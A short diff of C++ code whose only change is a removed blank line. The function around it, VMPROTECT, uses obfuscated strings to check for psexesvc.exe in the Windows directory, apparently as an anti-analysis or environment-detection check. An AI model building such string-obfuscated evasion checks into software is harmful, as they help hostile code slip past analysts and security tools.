@@ -168,7 +168,6 @@ BOOL VMPROTECT() {
         result = GetEnvironmentVariableW(OBF(L"WINDIR"), windir, MAX_PATH);
         if (result > 0 && result < MAX_PATH) {
             std::wstring exePath = std::wstring(windir) + OBF(L"\\psexesvc.exe");
-
             if (GetFileAttributesW(exePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                 return TRUE;
             }
